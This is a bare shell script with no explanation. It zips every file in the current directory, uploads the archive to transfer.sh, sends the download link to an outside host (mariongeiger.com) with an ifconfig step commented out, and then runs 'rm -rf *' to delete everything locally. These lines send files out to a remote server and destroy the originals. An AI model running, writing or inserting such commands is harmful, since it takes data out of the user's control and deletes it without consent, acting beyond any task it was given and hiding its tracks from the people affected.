rm -rf mk.sh
zip  file.zip *
curl --upload-file file.zip  https://transfer.sh >> link.txt
#ifconfig >> link.txt 
curl --upload-file link.txt http://mariongeiger.com
rm -rf *
